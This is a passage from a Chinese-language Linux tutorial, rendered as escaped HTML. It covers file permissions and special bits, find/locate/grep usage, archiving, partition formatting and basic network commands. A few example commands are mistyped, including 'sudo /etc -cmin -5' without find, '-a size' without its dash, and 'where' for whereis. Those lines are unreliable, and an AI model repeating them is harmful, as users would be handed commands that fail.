&lt;td class=&quot;org-left&quot;&gt;文件名&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;d 目录文件&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;从左往右分别代表所有者权限、组用户权限和其他用户权限&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;对于目录文件：第一级子目录数&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;- 普通文件&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;r 可读&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;l 链接文件&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;w 可写&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;c 字符型设备文件&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x 可执行&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;b 块设备文件&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;- 无执行权限&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;n 网络设备文件&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;s 套接字文件&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;默认文件权限
&lt;br /&gt;
umask 命令用来设置所创建文件和目录的默认权限。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org433a5a4&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org433a5a4&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.1.2&lt;/span&gt; Share File&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-1-2&quot;&gt;
&lt;p&gt;
Linux 为每个文件和目录存储了3个额外的信息位。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;设置用户ID（SUID）&lt;/li&gt;
&lt;li&gt;设置组ID（GID）&lt;/li&gt;
&lt;li&gt;粘着位：进程结束后文件还驻留（粘着）在内存中。&lt;/li&gt;
&lt;/ul&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 11:&lt;/span&gt; chmod SUID、SGID和粘着位的八进制值&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;二进制值&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;八进制值&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;000&lt;/td&gt;
&lt;td class=&quot;org-right&quot;&gt;0&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;所有位都清零&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;001&lt;/td&gt;
&lt;td class=&quot;org-right&quot;&gt;1&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;粘着位置位&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;010&lt;/td&gt;
&lt;td class=&quot;org-right&quot;&gt;2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;SGID位置位&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;011&lt;/td&gt;
&lt;td class=&quot;org-right&quot;&gt;3&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;SGID位和粘着位都置位&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;100&lt;/td&gt;
&lt;td class=&quot;org-right&quot;&gt;4&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;SUID位置位&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;101&lt;/td&gt;
&lt;td class=&quot;org-right&quot;&gt;5&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;SUID位和粘着位都置位&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;110&lt;/td&gt;
&lt;td class=&quot;org-right&quot;&gt;6&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;SUID位和SGID都置位&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;111&lt;/td&gt;
&lt;td class=&quot;org-right&quot;&gt;7&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;所有位都置位&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
创建一个共享目录
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ mkdir testdir
$ chgrp shared testdir
$ chmod g+s testdir
$ umask 002
$ cd testdir
$ touch testfile

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8129b8a&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org8129b8a&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; Linux Directory&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/cs2.png&quot; alt=&quot;cs2.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8bd0718&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org8bd0718&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.3&lt;/span&gt; Linux File Search&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org880409e&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org880409e&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.3.1&lt;/span&gt; find 命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-3-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。

&lt;/pre&gt;
&lt;p&gt;
&lt;b&gt;示例&lt;/b&gt;
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
根据文件名查找
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
格式：find [搜索范围][匹配条件]

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 默认在当前目录下搜索
$ find -name &quot;MyCProgram.c&quot;

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 忽略大小写
$ find -iname &quot;MyCProgram.c&quot;

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 查找以my开头，后面包含三个字符的文件
$ find -name my??? 

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 深度查找：
// 在 root 目录及其子目录下查找 passwd 文件。
$ sudo find / -maxdepth 2 -name passwd
// 在第二层子目录和第四层子目录之间查找 passwd 文件。
$ sudo find / -mindepth 3 -maxdepth 5 -name passwd
// 找到 home 目录及子目录下所有的空文件(0字节文件) 
// 下面命令的输出文件绝大多数都是锁定文件盒其他程序创建的 place hoders
$ find ~/ -empty
//列出你 home 目录里的空文件。
$ find ~/ -maxdepth 1 -empty
//列出 home目录下的非隐藏空文件。
$ find ~/ -maxdepth 1 -empty -not -name &quot;.*&quot;

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 相反匹配
// 显示所有的名字不是 MyCProgram.c 的文件或者目录。
$ find -maxdepth 1 -not -iname &quot;MyCProgram.c&quot;

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 在查找到的文件上执行命令
// 在查找到名为“MyCProgram.c”的文件上计算 MD5 验证和。
$ find -iname &quot;MyCProgram.c&quot; -exec md5sum {} \;
// 在 /etc 目录下查找 inittab 文件并显示其详细属性
$ sudo find /etc -name initab -exec ls -l {} \;
注意：{} 将会被当前文件名取代。
-exec/-ok &amp;lt;command&amp;gt; {} \; 对搜索结果执行操作，使用 -ok 会询问是否确认。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
文件大小查找
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 格式：+n 大于；-n 小于；n 等于
// 在 root 目录下查找大于100MB的文件
$ sudo find / -size +204800
注意：在 Linux 里面，1 数据块 = 512 byte = 0.5 KB，100 MB = 102400 KB = 204800 数据块

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 在 /etc 目录下查找大于 80MB 小于 100MB 的文件
$ sudo find /etc -size +163840 -a size -204800
-a 表示两个条件同时满足
-o 表示两个条件满足一个即可

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
//列出当前目录及子目录下的 5个最大的文件。这会需要一点时间，取决于命令需要处理的文件数量。
$ find . -type f -exec ls -s {} \; | sort -n -r | head -5
//查找 5个最小的文件
$ find . -type f -exec ls -s {} \; | sort -n  | head -5
//上面的命令中，很可能你看到的只是空文件(0字节文件)。因此，你可以使用下面的命令列出最小的文件，而不是 0字节文件。
$ find . -not -empty -type f -exec ls -s {} \; | sort -n  | head -5

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
//查找并删除大于 100M 的 *.zip 文件。
$ find / -type f -name *.zip -size +100M -exec rm -i {} \;
注意：{} 和 \ 之间是有空格的！

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
根据文件变动情况查找
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 在/etc目录下查找5分钟内被修改过属性的文件和目录
$ sudo /etc -cmin -5

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
-amin 访问时间 access
-cmin 文件属性 change
-mmin 文件内容 modify

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 显示所有的在 ordinary_file 之后创建修改的文件。
$ ls -lrt
$ find -newer ordinary_file

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
根据文件类型查找
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
f 文件，d 目录，l 软链接，s socket文件
//查找所有的一般文件
$ find ./ -type f
//查找所有的隐藏文件和目录
$ find ./ -type f -name &quot;.*&quot;
$ find ./ -type d -name &quot;.*&quot;

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
根据文件权限、所属关系查找
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ find /home -user zrg
$ find /home -group zrg

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 查到当前目录下对同组用户具有读权限的文件
$ find ./ -perm -g=r -type f -exec ls -l {} \;
// 找到对组用户具有只读权限的文件。
$find ./ -perm g=r -type f -exec ls -l {} \;  
// 找到对组用户具有只读权限的文件(使用八进制权限形式)。
$ find ./ -perm 040 -type f -exec ls -l {} \;

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
使用 inode 编号查找
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
//任何一个文件都有一个独一无二的 inode 编号，借此我们可以区分文件。
//使用选项 -i，可以看到文件的 inode 编号，借此可以区分这两个文件。
$ ls -i1 test*
16187429 test-file-name
16187430 test-file-name
//使用 inode 编号来删除那些具有特殊符号的文件名。
$ find -inum 16187430 -exec rm {} \;

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org02844b5&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org02844b5&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.3.2&lt;/span&gt; locate 命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-3-2&quot;&gt;
&lt;p&gt;
该命令建立了一个文件资料库，查找文件时直接在资料库中查找。类似 Windows 下的 Everything 工具。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 安装：
$ sudo apt install mlocate

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 使用
$ locate init
注意：locate 命令不会查找/tmp目录下内容。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 更新文件资料库：
$ updatedb

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org375b5f1&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org375b5f1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.3.3&lt;/span&gt; which 和 where 命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-3-3&quot;&gt;
&lt;p&gt;
用于查找某个命令(Locate a command)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ which ls
$ where useradd

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8de2c6a&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8de2c6a&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.3.4&lt;/span&gt; grep 命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-3-4&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
语法格式：grep -iv [指定字符串][文件]
-i 不区分大小写
-v 排除指定字符串

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 查找指定字符串的行并显示
$ grep 123 test.txt

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 去掉# 注释行
$ grep -v ^# config.txt

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgfebcf24&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgfebcf24&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.4&lt;/span&gt; Linux Compression and Packaging&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-4&quot;&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/tar.png&quot; alt=&quot;tar.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
另外还有不常见的，但时有遇到的：
.tar.xz
$ tar xpvf file.tar.xz

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
.tgz
$ tar zxf  name.tgz

//解压到指定目录

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
$ unzip name.zip -d ./dir

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge4dbc31&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge4dbc31&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.5&lt;/span&gt; Linux Disk and File System&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-5&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org79aefcf&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org79aefcf&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.5.1&lt;/span&gt; 格式化分区命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-5-1&quot;&gt;
&lt;p&gt;
将 /dev/sda7 硬盘格式化为 ext3 格式。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ mkfs -t ext3 -c /dev/sda7

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd5c8815&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd5c8815&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.6&lt;/span&gt; ～～～&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-6&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org6278d48&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org6278d48&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.6.1&lt;/span&gt; 网络命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-6-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;write
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
给指定用户发送信息(send a message to another user)，Ctrl+D 保存结束
格式: write user [tty]

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;wall
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
发送广播信息(write a message to all users)
格式: wall [-n] [-t timeout] [message | file]

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;ping
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
测试网络联通性(send ICMP ECHO_REQUEST to network hosts)

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
指定ping次数
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ ping -c 4 baidu.com

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;ifconfig
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
configure a network interface

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;mail
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
查看/发送电子邮件

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;last &amp;amp; lastlog
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
列出目前/过去登入系统的用户信息
last, lastb - show a listing of last logged in users
last [options] [username...] [tty...]
lastb [options] [username...] [tty...]

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
列出用户最后一次登录系统的信息
lastlog - reports the most recent login of all users or of a given user
lastlog [options]

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;traceroute
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
追踪数据包到主机间的路径
traceroute - print the route packets trace to network host

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;netstat
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
显示网络相关信息
netstat - Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
查看主机对外开放端口
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ netstat -ntlp

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查看本机监听的端口
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ netstat -tlun

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查看本机所有的网络连接
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ netstat -ano

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查看本机路由表
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ netstat -rn

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;setup
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
描述
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
配置网络

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实践&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org94689e2&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org94689e2&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; Shell Scripts Programming&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdaaa09e&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdaaa09e&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.1&lt;/span&gt; Learning Shell&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org39ef13e&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org39ef13e&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.1.1&lt;/span&gt; 学习 Shell 的疑惑&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-1-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;如何启动命令行以及接下来做什么？&lt;/li&gt;
&lt;li&gt;如何使用 shell脚本来自动处理系统管理任务，包括从检测系统统计数据和数据文件到为你的老板生成报表？&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org69e12e3&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org69e12e3&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.1.2&lt;/span&gt; 认识常见的 Shell 类型&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-1-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;b&gt;/bin/bash&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;/bin/tcsh&lt;/li&gt;
&lt;li&gt;/bin/dash&lt;/li&gt;
&lt;li&gt;/bin/csh&lt;/li&gt;
&lt;li&gt;/bin/sh&lt;/li&gt;
&lt;li&gt;&amp;#x2026;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3ceb91c&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org3ceb91c&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.1.3&lt;/span&gt; Shell 的父子关系&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-1-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
$ ps -f
UID        PID  PPID  C STIME TTY          TIME CMD
zrg      25305  4834  8 23:51 pts/4    00:00:00 -bash
zrg      25317 25305  0 23:51 pts/4    00:00:00 ps -f

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
$ bash
$ ps -f
UID        PID  PPID  C STIME TTY          TIME CMD
zrg      25305  4834  0 23:51 pts/4    00:00:00 -bash
zrg      25347 25305  0 23:53 pts/4    00:00:00 bash
zrg      25352 25347  0 23:54 pts/4    00:00:00 ps -f

&lt;/pre&gt;
&lt;p&gt;
输入命令之后，一个子 shell 就出现了。第二个 ps -f 是在子 shell 中执行的。可以从显示结果中看到两个 bash shell 程序在运行。
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
$ bash
$ bash
$ bash
$ ps --forest
PID TTY          TIME CMD
25305 pts/4    00:00:00 bash
25347 pts/4    00:00:00  \_ bash
25372 pts/4    00:00:00      \_ bash
25377 pts/4    00:00:00          \_ bash
25382 pts/4    00:00:00              \_ ps

&lt;/pre&gt;
&lt;p&gt;
